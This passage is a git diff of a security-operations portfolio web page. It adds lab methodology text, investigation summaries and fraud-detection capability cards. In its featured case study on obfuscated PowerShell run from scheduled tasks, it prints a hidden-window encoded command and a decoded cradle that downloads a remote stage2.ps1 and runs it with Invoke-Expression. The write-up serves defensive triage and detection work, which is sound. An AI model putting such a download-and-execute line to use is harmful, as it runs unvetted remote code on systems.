@@ -3,32 +3,25 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Privacy Skill Vault | Security Operations, Investigations & Lab Testing</title>
+  <title>PRIVACY SKILL VAULT | Cyber Security Operations & Labs</title>
   
-  <!-- SEO & OpenGraph Meta Tags -->
-  <meta name="description" content="Documenting real-world threat analysis, cyber fraud administration, SIEM workflows, and lab-based defensive engineering.">
+  <meta name="description" content="Documenting real-world threat analysis, cyber fraud administration, and lab-based defensive engineering.">
   <meta property="og:title" content="Privacy Skill Vault | Security Operations & Labs">
   <meta property="og:description" content="Operational investigations, fraud detection logic, and security lab blueprints.">
   <meta property="og:type" content="website">
-  <meta property="og:url" content="https://privacyskillvault.github.io/">
 
-  <!-- Fonts: Google Inter & Fira Code for Telemetry/Code Blocks -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  
-  <!-- FontAwesome Vector Icons -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
-  <!-- Production CSS Stylesheet -->
   <style>
-    /* ================= GLOBAL STYLES & RESET ================= */
     :root {
       --bg-dark: #020713;
-      --bg-surface: #0b1329;
-      --bg-surface-alt: #050b1e;
+      --bg-surface: #0b1736;
+      --bg-surface-alt: #050c21;
       --bg-code: #050d21;
-      --border-color: #172a4d;
+      --border-color: #162b54;
       --text-main: #f1f5f9;
       --text-muted: #94a3b8;
       --accent-blue: #2563eb;
@@ -40,11 +33,7 @@
       --emerald-success: #10b981;
     }
 
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
 
     html {
       scroll-behavior: smooth;
@@ -64,17 +53,9 @@
       background-color: var(--bg-dark);
     }
 
-    a {
-      color: inherit;
-      text-decoration: none;
-    }
+    a { color: inherit; text-decoration: none; }
 
-    /* ================= TYPOGRAPHY ================= */
-    h1, h2, h3, h4 {
-      color: #ffffff;
-      font-weight: 700;
-      letter-spacing: -0.02em;
-    }
+    h1, h2, h3, h4 { color: #ffffff; font-weight: 700; letter-spacing: -0.02em; }
 
     .accent-gradient-text {
       background: linear-gradient(90deg, #60a5fa 0%, var(--cyan-glow) 100%);
@@ -82,219 +63,94 @@
       -webkit-text-fill-color: transparent;
     }
 
-    .mono-font {
-      font-family: 'Fira Code', monospace;
-    }
+    .mono-font { font-family: 'Fira Code', monospace; }
 
-    /* ================= LAYOUT CONTAINERS ================= */
-    .max-container {
-      max-width: 1280px;
-      margin: 0 auto;
-      padding: 0 1.5rem;
-      width: 100%;
-    }
+    .max-container { max-width: 1280px; margin: 0 auto; padding: 0 1.5rem; width: 100%; }
 
     .section-card {
-      background: linear-gradient(180deg, rgba(11, 19, 41, 0.8) 0%, rgba(5, 11, 30, 0.95) 100%);
+      background: linear-gradient(180deg, rgba(11, 23, 54, 0.8) 0%, rgba(5, 12, 33, 0.95) 100%);
       border: 1px solid var(--border-color);
       border-radius: 0.75rem;
       padding: 2rem;
       box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.5);
     }
 
-    .page-section {
-      display: none;
-      animation: fadeIn 0.25s ease-in-out;
-    }
-
-    .page-section.active {
-      display: block;
-    }
+    .page-section { display: none; animation: fadeIn 0.25s ease-in-out; }
+    .page-section.active { display: block; }
 
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(4px); }
       to { opacity: 1; transform: translateY(0); }
     }
 
-    /* ================= NAVIGATION BAR ================= */
     .navbar {
-      position: sticky;
-      top: 0;
-      z-index: 50;
+      position: sticky; top: 0; z-index: 50;
       background-color: rgba(2, 7, 19, 0.9);
       backdrop-filter: blur(12px);
-      border-bottom: 1px solid rgba(23, 42, 77, 0.8);
-      height: 4.5rem;
-      display: flex;
-      align-items: center;
+      border-bottom: 1px solid rgba(22, 43, 84, 0.8);
+      height: 4.5rem; display: flex; align-items: center;
     }
 
-    .nav-wrapper {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      width: 100%;
-    }
+    .nav-wrapper { display: flex; align-items: center; justify-content: space-between; width: 100%; }
+    .brand-logo { display: flex; align-items: center; gap: 0.75rem; }
+    .brand-logo-icon { color: var(--accent-blue); font-size: 1.5rem; }
+    .brand-title { font-size: 1.125rem; font-weight: 800; letter-spacing: -0.01em; }
+    .brand-subtitle { font-size: 0.625rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; }
 
-    .brand-logo {
-      display: flex;
-      align-items: center;
-      gap: 0.75rem;
-    }
+    .nav-links { display: flex; align-items: center; gap: 1.75rem; font-size: 0.875rem; font-weight: 500; color: var(--text-muted); }
+    .nav-links a { padding: 0.25rem 0; transition: color 0.2s; }
+    .nav-links a:hover { color: #ffffff; }
+    .nav-links a.active-nav { color: var(--cyan-glow); border-bottom: 2px solid var(--cyan-glow); }
 
-    .brand-logo-icon {
-      color: var(--accent-blue);
-      font-size: 1.5rem;
-    }
-
-    .brand-title {
-      font-size: 1.125rem;
-      font-weight: 800;
-      letter-spacing: -0.01em;
-    }
-
-    .brand-subtitle {
-      font-size: 0.625rem;
-      color: var(--text-muted);
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-    }
-
-    .nav-links {
-      display: flex;
-      align-items: center;
-      gap: 1.75rem;
-      font-size: 0.875rem;
-      font-weight: 500;
-      color: var(--text-muted);
-    }
-
-    .nav-links a {
-      padding: 0.25rem 0;
-      transition: color 0.2s;
-    }
-
-    .nav-links a:hover {
-      color: #ffffff;
-    }
-
-    .nav-links a.active-nav {
-      color: var(--cyan-glow);
-      border-bottom: 2px solid var(--cyan-glow);
-    }
-
-    /* ================= BUTTONS ================= */
     .btn {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.5rem;
-      font-size: 0.875rem;
-      font-weight: 600;
-      padding: 0.625rem 1.25rem;
-      border-radius: 0.5rem;
-      transition: all 0.2s ease-in-out;
-      cursor: pointer;
-      border: none;
+      display: inline-flex; align-items: center; justify-content: center; gap: 0.5rem;
+      font-size: 0.875rem; font-weight: 600; padding: 0.625rem 1.25rem; border-radius: 0.5rem;
+      transition: all 0.2s ease-in-out; cursor: pointer; border: none;
     }
 
     .btn-primary {
-      background-color: var(--accent-blue);
-      color: #ffffff;
+      background-color: var(--accent-blue); color: #ffffff;
       box-shadow: 0 0 20px rgba(37, 99, 235, 0.35);
     }
-
-    .btn-primary:hover {
-      background-color: var(--accent-blue-hover);
-      box-shadow: 0 0 25px rgba(37, 99, 235, 0.55);
-    }
+    .btn-primary:hover { background-color: var(--accent-blue-hover); box-shadow: 0 0 25px rgba(37, 99, 235, 0.55); }
 
     .btn-secondary {
-      background-color: rgba(15, 23, 42, 0.6);
-      border: 1px solid var(--border-color);
-      color: var(--text-main);
+      background-color: rgba(15, 23, 42, 0.6); border: 1px solid var(--border-color); color: var(--text-main);
     }
+    .btn-secondary:hover { border-color: var(--text-muted); background-color: rgba(30, 41, 59, 0.8); }
 
-    .btn-secondary:hover {
-      border-color: var(--text-muted);
-      background-color: rgba(30, 41, 59, 0.8);
-    }
-
-    /* ================= CARDS & GRID ================= */
     .focus-card {
       background: linear-gradient(180deg, #0b1736 0%, #050c21 100%);
-      border: 1px solid var(--border-color);
-      border-radius: 0.75rem;
-      padding: 1.5rem;
+      border: 1px solid var(--border-color); border-radius: 0.75rem; padding: 1.5rem;
       transition: transform 0.2s, box-shadow 0.2s;
     }
-
-    .focus-card:hover {
-      transform: translateY(-2px);
-    }
-
-    .focus-card.soc {
-      border-top: 2px solid var(--cyan-glow);
-      box-shadow: 0 0 15px -3px rgba(56, 189, 248, 0.15);
-    }
-
-    .focus-card.fraud {
-      border-top: 2px solid var(--purple-glow);
-      box-shadow: 0 0 15px -3px rgba(168, 85, 247, 0.15);
-    }
-
-    .focus-card.lab {
-      border-top: 2px solid var(--teal-glow);
-      box-shadow: 0 0 15px -3px rgba(20, 184, 166, 0.15);
-    }
+    .focus-card:hover { transform: translateY(-2px); }
+    .focus-card.soc { border-top: 2px solid var(--cyan-glow); box-shadow: 0 0 15px -3px rgba(56, 189, 248, 0.15); }
+    .focus-card.fraud { border-top: 2px solid var(--purple-glow); box-shadow: 0 0 15px -3px rgba(168, 85, 247, 0.15); }
+    .focus-card.lab { border-top: 2px solid var(--teal-glow); box-shadow: 0 0 15px -3px rgba(20, 184, 166, 0.15); }
 
     .icon-box {
-      width: 2.5rem;
-      height: 2.5rem;
-      border-radius: 0.5rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.125rem;
-      margin-bottom: 1rem;
+      width: 2.5rem; height: 2.5rem; border-radius: 0.5rem; display: flex;
+      align-items: center; justify-content: center; font-size: 1.125rem; margin-bottom: 1rem;
     }
-
     .icon-box.blue { background: rgba(56, 189, 248, 0.1); color: var(--cyan-glow); border: 1px solid rgba(56, 189, 248, 0.2); }
     .icon-box.purple { background: rgba(168, 85, 247, 0.1); color: var(--purple-glow); border: 1px solid rgba(168, 85, 247, 0.2); }
     .icon-box.teal { background: rgba(20, 184, 166, 0.1); color: var(--teal-glow); border: 1px solid rgba(20, 184, 166, 0.2); }
 
-    /* ================= CODE BLOCKS ================= */
     .code-container {
-      background-color: var(--bg-code);
-      border: 1px solid var(--border-color);
-      border-radius: 0.5rem;
-      padding: 1rem;
-      font-family: 'Fira Code', monospace;
-      font-size: 0.75rem;
-      overflow-x: auto;
-      color: #e2e8f0;
-      position: relative;
+      background-color: var(--bg-code); border: 1px solid var(--border-color);
+      border-radius: 0.5rem; padding: 1rem; font-family: 'Fira Code', monospace;
+      font-size: 0.75rem; overflow-x: auto; color: #e2e8f0; position: relative;
     }
 
     .copy-btn {
-      position: absolute;
-      top: 0.5rem;
-      right: 0.5rem;
-      background: rgba(30, 41, 59, 0.8);
-      border: 1px solid var(--border-color);
-      color: var(--text-muted);
-      padding: 0.25rem 0.5rem;
-      font-size: 0.65rem;
-      border-radius: 0.25rem;
-      cursor: pointer;
+      position: absolute; top: 0.5rem; right: 0.5rem;
+      background: rgba(30, 41, 59, 0.8); border: 1px solid var(--border-color);
+      color: var(--text-muted); padding: 0.25rem 0.5rem; font-size: 0.65rem;
+      border-radius: 0.25rem; cursor: pointer;
     }
+    .copy-btn:hover { color: #ffffff; background: var(--accent-blue); }
 
-    .copy-btn:hover {
-      color: #ffffff;
-      background: var(--accent-blue);
-    }
-
-    /* ================= RESPONSIVE DESIGN ================= */
     @media (max-width: 768px) {
       .nav-links { display: none; }
       .grid-3 { grid-template-columns: 1fr !important; }
@@ -302,7 +158,6 @@
       .hero-grid { grid-template-columns: 1fr !important; }
     }
 
-    /* Utility Grids */
     .grid-2 { display: grid; grid-template-columns: repeat(2, 1fr); gap: 1.5rem; }
     .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; }
     .grid-4 { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; }
@@ -312,7 +167,7 @@
 </head>
 <body>
 
-  <!-- ================= GLOBAL NAVBAR ================= -->
+  <!-- GLOBAL NAVBAR -->
   <header class="navbar">
     <div class="max-container nav-wrapper">
       <a href="#home" onclick="navTo('home')" class="brand-logo">
@@ -338,13 +193,13 @@
     </div>
   </header>
 
-  <!-- ================= MAIN CONTENT CONTAINER ================= -->
+  <!-- MAIN CONTENT CONTAINER -->
   <main class="max-container" style="padding-top: 2.5rem; padding-bottom: 3rem;">
 
     <!-- ================= PAGE 1: HOME ================= -->
     <section id="page-home" class="page-section active">
       
-      <!-- Hero Section -->
+      <!-- 1. Hero Section -->
       <div class="grid-2 hero-grid" style="align-items: center; gap: 2rem;">
         <div>
           <span style="font-size: 0.75rem; font-weight: 700; letter-spacing: 0.1em; color: var(--cyan-glow); text-transform: uppercase;">
@@ -366,7 +221,6 @@
           </div>
         </div>
 
-        <!-- Hero Terminal Graphic -->
         <div class="section-card" style="padding: 1rem;">
           <div class="flex-between" style="border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; margin-bottom: 0.75rem;">
             <div style="display: flex; gap: 0.35rem;">
@@ -385,7 +239,7 @@
         </div>
       </div>
 
-      <!-- Focus Areas Section -->
+      <!-- 2. Focus Areas -->
       <div class="space-y">
         <div style="text-align: center; margin-bottom: 2rem;">
           <h2 style="font-size: 1.5rem;">Focus Areas</h2>
@@ -419,12 +273,18 @@
         </div>
       </div>
 
-      <!-- Lab Topology SVG Container -->
+      <!-- 3. Lab Environment at a Glance -->
       <div class="section-card space-y">
         <div class="flex-between" style="border-bottom: 1px solid var(--border-color); padding-bottom: 1rem; margin-bottom: 1.5rem;">
           <div>
             <h2 style="font-size: 1.25rem;">Lab Topology & Telemetry Architecture</h2>
             <p style="color: var(--text-muted); font-size: 0.75rem; margin-top: 0.25rem;">Simulating production conditions to analyze log fidelity, detection coverage, and alert latency across virtualized network segments.</p>
+          </div>
+
+          <div style="display: flex; gap: 0.75rem;">
+            <span style="background: rgba(56, 189, 248, 0.1); border: 1px solid rgba(56, 189, 248, 0.2); color: var(--cyan-glow); font-size: 0.65rem; padding: 0.35rem 0.65rem; border-radius: 0.35rem;">Network Visibility</span>
+            <span style="background: rgba(56, 189, 248, 0.1); border: 1px solid rgba(56, 189, 248, 0.2); color: var(--cyan-glow); font-size: 0.65rem; padding: 0.35rem 0.65rem; border-radius: 0.35rem;">Endpoint Telemetry</span>
+            <span style="background: rgba(56, 189, 248, 0.1); border: 1px solid rgba(56, 189, 248, 0.2); color: var(--cyan-glow); font-size: 0.65rem; padding: 0.35rem 0.65rem; border-radius: 0.35rem;">Ingestion Pipeline</span>
           </div>
         </div>
 
@@ -464,6 +324,51 @@
         </div>
       </div>
 
+      <!-- 4. Operational Methodology -->
+      <div class="section-card space-y">
+        <div class="grid-2" style="align-items: center;">
+          <div>
+            <h2 style="font-size: 1.5rem; line-height: 1.3;">Why Hands-On<br/>Lab Testing Matters</h2>
+            <p style="color: var(--cyan-glow); font-size: 0.875rem; margin-top: 0.5rem; font-weight: 600;">Bridging the gap between theoretical security concepts and messy operational reality.</p>
+          </div>
+          <div style="font-size: 0.825rem; color: var(--text-muted); line-height: 1.6;">
+            <p>Much of cybersecurity content focuses heavily on theoretical concepts or simplified demonstrations that rarely reflect production environments. Real-world analysis is unpredictable:</p>
+            <ul style="list-style: none; margin-top: 0.75rem; display: flex; flex-direction: column; gap: 0.5rem;">
+              <li style="display: flex; items-center; gap: 0.5rem;"><i class="fa-solid fa-circle-check" style="color: var(--accent-blue);"></i> Alerts can be extremely noisy and prone to false positives.</li>
+              <li style="display: flex; items-center; gap: 0.5rem;"><i class="fa-solid fa-circle-check" style="color: var(--accent-blue);"></i> Logs are often incomplete, unparsed, or misconfigured.</li>
+              <li style="display: flex; items-center; gap: 0.5rem;"><i class="fa-solid fa-circle-check" style="color: var(--accent-blue);"></i> Security tools behave differently depending on network architecture and logging depth.</li>
+            </ul>
+            <p style="margin-top: 0.75rem;">The goal of Privacy Skill Vault is not just to showcase clean, successful outcomes, but to document why configurations break, how alerts fire under stress, and how issues are systematically identified through structured analysis.</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- 5. Recent Technical Write-ups -->
+      <div class="space-y">
+        <div style="text-align: center; margin-bottom: 2rem;">
+          <h2 style="font-size: 1.5rem;">Latest Investigations & Lab Reports</h2>
+          <p style="color: var(--text-muted); font-size: 0.825rem; margin-top: 0.25rem;">Explore recent breakdowns of alert investigations, detection engineering notes, and security lab guides.</p>
+        </div>
+
+        <div class="grid-3">
+          <div class="section-card" style="padding: 1.25rem;">
+            <span style="font-size: 0.65rem; color: var(--cyan-glow); font-weight: 700;">SIEM INVESTIGATION</span>
+            <h3 style="font-size: 0.875rem; margin-top: 0.5rem; margin-bottom: 0.75rem;">Investigating Privilege Escalation via Token Manipulation</h3>
+            <p style="font-size: 0.75rem; color: var(--text-muted);">May 18, 2026 • 12 min read</p>
+          </div>
+          <div class="section-card" style="padding: 1.25rem;">
+            <span style="font-size: 0.65rem; color: var(--cyan-glow); font-weight: 700;">DETECTION ENGINEERING</span>
+            <h3 style="font-size: 0.875rem; margin-top: 0.5rem; margin-bottom: 0.75rem;">Reducing False Positives in Windows Logon Alerts</h3>
+            <p style="font-size: 0.75rem; color: var(--text-muted);">May 12, 2026 • 10 min read</p>
+          </div>
+          <div class="section-card" style="padding: 1.25rem;">
+            <span style="font-size: 0.65rem; color: var(--cyan-glow); font-weight: 700;">LAB GUIDE</span>
+            <h3 style="font-size: 0.875rem; margin-top: 0.5rem; margin-bottom: 0.75rem;">Building a Detection Lab with pfSense, Suricata & Elastic</h3>
+            <p style="font-size: 0.75rem; color: var(--text-muted);">May 7, 2026 • 15 min read</p>
+          </div>
+        </div>
+      </div>
+
     </section>
 
     <!-- ================= PAGE 2: INVESTIGATIONS ================= -->
@@ -471,46 +376,100 @@
       <div style="margin-bottom: 2rem;">
         <span style="font-size: 0.75rem; font-weight: 700; color: var(--cyan-glow); text-transform: uppercase;">INVESTIGATIONS</span>
         <h1 style="font-size: 2rem; margin-top: 0.25rem;">Operational Investigations & Threat Triage</h1>
-        <p style="color: var(--text-muted); font-size: 0.875rem; margin-top: 0.5rem;">Structured walkthroughs of alert triage, raw log correlation, and forensic analysis across simulated threat scenarios.</p>
+        <p style="color: var(--text-muted); font-size: 0.875rem; margin-top: 0.5rem;">Structured walkthroughs of alert triage, raw log correlation, and forensic analysis across simulated threat scenarios. Documenting investigation methodologies, detection logic, and false-positive reduction.</p>
       </div>
 
-      <!-- Featured Case Study -->
+      <!-- Filter Bar -->
+      <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1.5rem;">
+        <button class="btn btn-primary" style="padding: 0.35rem 0.75rem; font-size: 0.75rem;">All</button>
+        <button class="btn btn-secondary" style="padding: 0.35rem 0.75rem; font-size: 0.75rem;">SIEM & Log Analysis</button>
+        <button class="btn btn-secondary" style="padding: 0.35rem 0.75rem; font-size: 0.75rem;">Network & PCAP</button>
+        <button class="btn btn-secondary" style="padding: 0.35rem 0.75rem; font-size: 0.75rem;">Endpoint Telemetry</button>
+        <button class="btn btn-secondary" style="padding: 0.35rem 0.75rem; font-size: 0.75rem;">False Positives</button>
+      </div>
+
+      <!-- Featured Case Study INV-024 -->
       <div class="section-card">
-        <div class="flex-between" style="border-bottom: 1px solid var(--border-color); padding-bottom: 1rem; margin-bottom: 1rem;">
+        <div class="flex-between" style="border-bottom: 1px solid var(--border-color); padding-bottom: 1rem; margin-bottom: 1rem; flex-wrap: wrap; gap: 0.5rem;">
           <div>
-            <span style="font-size: 0.65rem; color: var(--cyan-glow); font-weight: 700;">★ FEATURED CASE STUDY (INV-024)</span>
+            <span style="font-size: 0.65rem; color: var(--cyan-glow); font-weight: 700;">★ FEATURED CASE STUDY — ID: INV-024</span>
             <h2 style="font-size: 1.25rem; margin-top: 0.25rem;">Investigating Obfuscated PowerShell Execution via Scheduled Tasks</h2>
           </div>
-          <div>
+          <div style="display: flex; gap: 0.5rem;">
             <span style="background: rgba(245, 158, 11, 0.1); color: var(--amber-alert); border: 1px solid rgba(245, 158, 11, 0.2); font-size: 0.65rem; font-weight: 700; padding: 0.25rem 0.5rem; border-radius: 0.25rem;">Severity: Medium</span>
+            <span style="background: rgba(16, 185, 129, 0.1); color: var(--emerald-success); border: 1px solid rgba(16, 185, 129, 0.2); font-size: 0.65rem; font-weight: 700; padding: 0.25rem 0.5rem; border-radius: 0.25rem;">Status: Closed / Resolved</span>
           </div>
         </div>
 
         <div class="grid-2" style="font-size: 0.75rem;">
           <div style="display: flex; flex-direction: column; gap: 1rem;">
             <div style="background: var(--bg-surface-alt); padding: 1rem; border-radius: 0.5rem; border: 1px solid var(--border-color);">
-              <h3 style="color: var(--cyan-glow); font-size: 0.875rem; margin-bottom: 0.5rem;">1. Incident Trigger & Context</h3>
+              <h3 style="color: var(--cyan-glow); font-size: 0.875rem; margin-bottom: 0.5rem;">1. Incident Trigger & Initial Context</h3>
               <p style="color: var(--text-muted);"><strong style="color: #fff;">Alert Name:</strong> SUSPICIOUS_POWERSHELL_BASE64_EXEC</p>
               <p style="color: var(--text-muted); margin-top: 0.25rem;"><strong style="color: #fff;">Trigger Source:</strong> Windows Security Event Log (Event ID 4688) on endpoint HOST-FIN-02.</p>
+              <p style="color: var(--text-muted); margin-top: 0.25rem;"><strong style="color: #fff;">Initial Observation:</strong> An automated SIEM alert flagged an obfuscated PowerShell command executing under the SYSTEM account outside standard maintenance hours.</p>
             </div>
+
             <div style="background: var(--bg-surface-alt); padding: 1rem; border-radius: 0.5rem; border: 1px solid var(--border-color);">
-              <h3 style="color: var(--cyan-glow); font-size: 0.875rem; margin-bottom: 0.5rem;">3. Investigation Workflow</h3>
-              <p style="color: var(--text-muted);">1. Payload Decoding: Extracted Base64 string from Sysmon Event ID 1.</p>
-              <p style="color: var(--text-muted); margin-top: 0.25rem;">2. Parent-Child Analysis: Verified powershell.exe was spawned by taskeng.exe.</p>
+              <h3 style="color: var(--cyan-glow); font-size: 0.875rem; margin-bottom: 0.5rem;">3. Investigation & Triage Workflow</h3>
+              <ol style="margin-left: 1rem; color: var(--text-muted); display: flex; flex-direction: column; gap: 0.35rem;">
+                <li><strong>Payload Decoding:</strong> Extracted Base64 string from Sysmon Event ID 1 and decoded using CyberChef to identify outbound destination.</li>
+                <li><strong>Parent-Child Analysis:</strong> Verified powershell.exe was spawned directly by taskeng.exe (Windows Scheduled Tasks).</li>
+                <li><strong>Network Telemetry Correlation:</strong> Cross-referenced firewall logs for outbound connections to 192.0.2.45 (12 attempts in 3 minutes).</li>
+                <li><strong>Host Verification:</strong> Interviewed system admin team; confirmed unannounced legacy maintenance script without updated service account.</li>
+              </ol>
             </div>
           </div>
 
           <div style="display: flex; flex-direction: column; gap: 1rem;">
             <div class="code-container">
-              <p style="color: var(--emerald-success);">UtcTime: 2026-07-12 02:14:08.112</p>
+              <p style="color: var(--text-muted);"># Sysmon Event ID 1 (Process Creation)</p>
+              <p style="color: var(--emerald-success); margin-top: 0.25rem;">UtcTime: 2026-07-12 02:14:08.112</p>
               <p style="color: var(--emerald-success);">ProcessId: 4820</p>
-              <p style="color: var(--emerald-success);">CommandLine: powershell.exe -NoP -NonI -W Hidden -e aX...</p>
+              <p style="color: var(--emerald-success);">Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</p>
+              <p style="color: var(--emerald-success);">CommandLine: powershell.exe -NoP -NonI -W Hidden -e aXdX...</p>
               <p style="color: var(--emerald-success);">ParentImage: C:\Windows\System32\taskeng.exe</p>
+              <p style="color: var(--emerald-success);">User: NT AUTHORITY\SYSTEM</p>
+              <br/>
+              <p style="color: var(--text-muted);"># Script Block Logging (Windows Event ID 4104 Decoded Payload)</p>
+              <p style="color: var(--cyan-glow);">$cli = New-Object System.Net.WebClient</p>
+              <p style="color: var(--cyan-glow);">$data = $cli.DownloadString('http://192.0.2.45/stage2.ps1')</p>
+              <p style="color: var(--cyan-glow);">Invoke-Expression $data</p>
             </div>
+
             <div style="background: var(--bg-surface-alt); padding: 1rem; border-radius: 0.5rem; border: 1px solid var(--border-color);">
-              <h3 style="color: var(--cyan-glow); font-size: 0.875rem; margin-bottom: 0.5rem;">4. Root Cause & Tuning</h3>
-              <p style="color: var(--text-muted);"><strong style="color: #fff;">Verdict:</strong> Authorized Administrator Misconfiguration (Policy Violation).</p>
+              <h3 style="color: var(--cyan-glow); font-size: 0.875rem; margin-bottom: 0.5rem;">4. Root Cause & Detection Tuning</h3>
+              <p style="color: var(--text-muted);"><strong style="color: #fff;">Verdict:</strong> Authorized Administrator Misconfiguration (True Positive for policy violation, False Positive for active malware).</p>
+              <ul style="margin-top: 0.5rem; color: var(--emerald-success); list-style: none;">
+                <li>✓ Reconfigured task to run via dedicated service account with restricted privileges.</li>
+                <li>✓ Updated SIEM detection rule to alert specifically on unquoted script paths.</li>
+              </ul>
             </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Investigation Repository Grid -->
+      <div class="space-y">
+        <h2 style="font-size: 1.25rem; margin-bottom: 1rem;">All Investigation Reports</h2>
+        <div class="grid-3">
+          <div class="section-card">
+            <span style="font-size: 0.65rem; color: var(--cyan-glow); font-weight: 700;">INV-023 | SIEM ANALYSIS</span>
+            <h3 style="font-size: 0.875rem; margin-top: 0.5rem;">Analyzing Privilege Escalation via Token Manipulation</h3>
+            <p style="font-size: 0.75rem; color: var(--text-muted); margin-top: 0.35rem;">Examining Windows Event ID 4672 and process access rights during unauthorized token impersonation attempts.</p>
+            <p style="font-size: 0.65rem; color: var(--text-muted); margin-top: 0.75rem;">May 18, 2026 • 12 min read</p>
+          </div>
+          <div class="section-card">
+            <span style="font-size: 0.65rem; color: var(--cyan-glow); font-weight: 700;">INV-022 | NETWORK & PCAP</span>
+            <h3 style="font-size: 0.875rem; margin-top: 0.5rem;">Detecting Beaconing Traffic Using Suricata & Zeek Logs</h3>
+            <p style="font-size: 0.75rem; color: var(--text-muted); margin-top: 0.35rem;">Identifying periodic outbound connections and domain generation patterns from compromised hosts in a controlled lab.</p>
+            <p style="font-size: 0.65rem; color: var(--text-muted); margin-top: 0.75rem;">May 16, 2026 • 15 min read</p>
+          </div>
+          <div class="section-card">
+            <span style="font-size: 0.65rem; color: var(--cyan-glow); font-weight: 700;">INV-021 | ENDPOINT TELEMETRY</span>
+            <h3 style="font-size: 0.875rem; margin-top: 0.5rem;">Malicious DLL Sideloading via Unsigned Service Execution</h3>
+            <p style="font-size: 0.75rem; color: var(--text-muted); margin-top: 0.35rem;">Investigating DLL search order hijacking and service persistence using Sysmon and Windows Event Logs.</p>
+            <p style="font-size: 0.65rem; color: var(--text-muted); margin-top: 0.75rem;">May 12, 2026 • 14 min read</p>
           </div>
         </div>
       </div>
@@ -520,27 +479,112 @@
     <section id="page-fraud-analysis" class="page-section">
       <div style="margin-bottom: 2rem;">
         <span style="font-size: 0.75rem; font-weight: 700; color: var(--cyan-glow); text-transform: uppercase;">FRAUD ANALYSIS</span>
-        <h1 style="font-size: 2rem; margin-top: 0.25rem;">Cyber Fraud Administrator Core Capabilities</h1>
-        <p style="color: var(--text-muted); font-size: 0.875rem; margin-top: 0.5rem;">Comprehensive expertise in identifying, analyzing, and mitigating cyber fraud threats targeting digital identities and user accounts.</p>
+        <h1 style="font-size: 2rem; margin-top: 0.25rem;">Cyber Fraud Administrator & Specialist Core Capabilities</h1>
+        <p style="color: var(--text-muted); font-size: 0.875rem; margin-top: 0.5rem;">Comprehensive expertise in identifying, analyzing, and mitigating cyber fraud threats targeting digital identities, web applications, and user accounts through behavioral intelligence, advanced analytics, and operational excellence.</p>
       </div>
 
+      <!-- 1. Anti-Fraud Threat Topology -->
       <div class="space-y">
-        <h2 style="font-size: 1.125rem; margin-bottom: 1rem; color: #fff;">1. Anti-Fraud Threat Topology & TTP Analysis</h2>
+        <h2 style="font-size: 1.125rem; margin-bottom: 1rem;">1. Anti-Fraud Threat Topology & TTP Analysis</h2>
         <div class="grid-3" style="font-size: 0.75rem;">
           <div class="section-card">
             <i class="fa-solid fa-user-lock" style="font-size: 1.25rem; color: var(--cyan-glow); margin-bottom: 0.5rem;"></i>
             <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Account Takeover (ATO) Detection</h3>
-            <p style="color: var(--text-muted);">Identifying unauthorized access via device fingerprinting, global IDs, parallel sessions, and geolocation shifts.</p>
+            <p style="color: var(--text-muted);">Identifying unauthorized access via device fingerprinting, device ID tracking, global cross-application identifiers, concurrent parallel sessions, and abnormal network or geolocation shifts.</p>
           </div>
           <div class="section-card">
             <i class="fa-solid fa-bug" style="font-size: 1.25rem; color: var(--purple-glow); margin-bottom: 0.5rem;"></i>
-            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Malware & Remote Access</h3>
-            <p style="color: var(--text-muted);">Detecting Trojans, keyloggers, screen sharing (AnyDesk, TeamViewer), accessibility abuse, and overlays.</p>
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Malware & Remote Access Detection</h3>
+            <p style="color: var(--text-muted);">Detecting banking Trojans, keyloggers, screen-sharing activities (AnyDesk, TeamViewer), accessibility service abuses, and automated overlay attacks.</p>
           </div>
           <div class="section-card">
             <i class="fa-solid fa-user-ninja" style="font-size: 1.25rem; color: var(--teal-glow); margin-bottom: 0.5rem;"></i>
-            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Anonymization & Evasion</h3>
-            <p style="color: var(--text-muted);">Tracking VPNs, proxies, hosting subnets, application cloning, Android emulators, and anti-detect browsers.</p>
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Anonymization & Defense Evasion Monitoring</h3>
+            <p style="color: var(--text-muted);">Tracking and flagging VPNs, proxies, hosting subnets, application cloning/sandboxing, Android emulators, and anti-detect browsers.</p>
+          </div>
+          <div class="section-card">
+            <i class="fa-solid fa-phone-slash" style="font-size: 1.25rem; color: var(--amber-alert); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Authorized Push Payment (APP) & Social Engineering</h3>
+            <p style="color: var(--text-muted);">Analyzing voice phishing/scams, public official/government impersonation schemes, fake rental/real-estate listing frauds, and romance/investment scams.</p>
+          </div>
+          <div class="section-card">
+            <i class="fa-solid fa-sitemap" style="font-size: 1.25rem; color: var(--cyan-glow); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Mule Account Networks</h3>
